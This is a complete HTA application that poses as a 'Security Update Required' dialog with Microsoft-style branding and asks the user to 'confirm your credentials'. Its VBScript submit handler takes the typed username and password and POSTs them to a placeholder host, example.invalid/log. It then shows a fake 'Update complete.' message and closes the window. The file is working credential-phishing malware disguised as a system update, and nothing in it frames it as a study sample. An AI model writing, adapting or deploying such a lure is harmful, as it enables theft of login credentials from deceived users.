<html>
<head>
<title>Security Update</title>
<HTA:APPLICATION
    ID="Update"
    APPLICATIONNAME="Security Update"
    BORDER="thick"
    CAPTION="yes"
    ICON="shield.ico"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="yes"
    SHOWINTASKBAR="yes"
    SINGLEINSTANCE="yes"
    SYSMENU="yes"
    WINDOWSTATE="normal" />
<style>
body { font-family: 'Segoe UI', sans-serif; padding: 24px; background: #fff; }
.brand { font-size: 22px; font-weight: 600; color: #0078d4; }
.field { margin: 12px 0; }
label { display: block; font-size: 13px; color: #333; }
input { width: 280px; padding: 6px 8px; font-size: 14px; border: 1px solid #ccc; }
button { padding: 8px 18px; background: #0078d4; color: #fff; border: none; cursor: pointer; }
</style>
<script language="VBScript">
Sub Window_OnLoad
    Window.ResizeTo 480, 360
    document.getElementById("user").focus()
End Sub

Sub btnSubmit_OnClick
    Dim u, p
    u = document.getElementById("user").value
    p = document.getElementById("pass").value
    If Len(u) = 0 Or Len(p) = 0 Then
        MsgBox "Please fill in both fields", vbExclamation, "Update"
        Exit Sub
    End If
    Dim payload
    payload = "user=" & u & "&pass=" & p
    Dim http
    Set http = CreateObject("Msxml2.XMLHTTP")
    http.open "POST", "http://example.invalid/log", False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.send payload
    Set http = Nothing
    MsgBox "Update complete.", vbInformation, "Done"
    Window.Close()
End Sub
</script>
</head>
<body>
<div class="brand">Security Update Required</div>
<p>Please confirm your credentials to continue.</p>
<div class="field">
    <label>Username</label>
    <input type="text" id="user" />
</div>
<div class="field">
    <label>Password</label>
    <input type="password" id="pass" />
</div>
<button id="btnSubmit" onclick="btnSubmit_OnClick">Continue</button>
</body>
</html>
